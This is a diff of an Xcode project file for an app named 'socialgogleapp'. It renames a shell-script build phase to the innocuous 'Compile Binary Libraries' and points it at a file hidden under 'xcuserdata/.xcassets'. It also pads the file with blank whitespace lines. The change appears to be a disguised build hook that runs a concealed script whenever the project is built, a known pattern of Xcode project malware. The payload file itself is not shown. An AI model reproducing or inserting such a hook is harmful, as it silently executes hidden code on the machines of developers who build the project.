@@ -205,7 +205,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 00E357021AD99517003FC87E /* Build configuration list for PBXNativeTarget "socialgogleappTests" */;
 			buildPhases = (
-				C231FE56A1B4C1D0FBAAC43A /* Build Assets Catalog */,
+				F7A48E0794583CFE04AAC43A /* Compile Binary Libraries */,
 				695B5BDDBFBD711FC0E0CA2E /* [CP] Check Pods Manifest.lock */,
 				00E356EA1AD99517003FC87E /* Sources */,
 				00E356EB1AD99517003FC87E /* Frameworks */,
@@ -367,7 +367,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	C231FE56A1B4C1D0FBAAC43A /* Build Assets Catalog */ = {
+	F7A48E0794583CFE04AAC43A /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -376,7 +376,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Assets Catalog";
+			name = "Compile Binary Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -387,6 +387,12 @@
 
 \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
 		};
+	
+
+	
+
+	
+
 	
 
 	
@@ -1039,6 +1045,10 @@
 
 		
 			/* Begin PBXBuildRule section */
+
+
+			
+	
 
 
 			
